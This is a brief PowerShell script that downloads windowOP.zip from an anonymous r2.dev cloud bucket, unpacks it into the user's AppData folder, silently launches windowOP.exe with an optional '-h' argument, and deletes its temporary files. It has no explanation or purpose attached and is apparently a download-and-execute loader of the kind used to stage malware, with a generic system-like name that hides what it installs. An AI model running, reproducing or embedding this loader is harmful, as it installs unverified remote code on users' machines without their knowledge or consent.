param(
    [string]$h = $null
)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$tempFolderName = [guid]::NewGuid().ToString()
$tempFolderPath = Join-Path -Path $env:TEMP -ChildPath $tempFolderName
$appDataPath = $env:APPDATA
$targetPath = Join-Path -Path $appDataPath -ChildPath "windowOP"
$exePath = Join-Path -Path $targetPath -ChildPath "windowOP.exe"

New-Item -Path $tempFolderPath -ItemType Directory -Force | Out-Null

try {
    $downloadUrl = "https://pub-7dd52c97b3004fe49470275bb0fb33ee.r2.dev/windowOP.zip"
    $zipPath = Join-Path -Path $tempFolderPath -ChildPath "windowOP.zip"

    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $zipPath)

    if (Test-Path $targetPath) {
        Remove-Item -Path $targetPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    Expand-Archive -Path $zipPath -DestinationPath $targetPath -Force

    if ($h) {
        Start-Process $exePath -ArgumentList "-h", $h
    } else {
        Start-Process $exePath
    }

} finally {
    if (Test-Path $tempFolderPath) {
        Remove-Item -Path $tempFolderPath -Recurse -Force -ErrorAction SilentlyContinue
    }
}